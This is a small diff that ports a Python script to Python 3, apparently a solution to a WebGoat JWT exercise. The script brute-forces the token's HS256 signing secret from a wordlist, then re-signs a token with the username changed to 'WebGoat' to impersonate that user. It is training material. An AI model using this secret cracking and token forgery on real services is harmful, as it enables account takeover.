@@ -1,5 +1,7 @@
 # -*- coding: utf-8 -*-
 
+# for python3
+
 from collections import OrderedDict
 import jwt
 import base64
@@ -39,13 +41,13 @@ if __name__ == '__main__':
 	for i in range(0, len(list)):
 		list[i] = list[i][:-1]
 	salt = bruteGetSalt(payload, list, oldJwt)
-	print 'salt is ' + salt
+	print('salt is ' + salt)
 
 	# 根据salt值计算目标jwt
 	payload['username'] = 'WebGoat'
 	newJwt = jwt.encode(payload, salt, algorithm = 'HS256')
-	print 'jwt is ' + newJwt
+	print('jwt is ' + newJwt)
 
 	# 从目标jwt中解析出payload
 	jsonPayload = getPayloadFromJwt(newJwt)
-	print 'payload is ' + jsonPayload
+	print('payload is ' + jsonPayload)
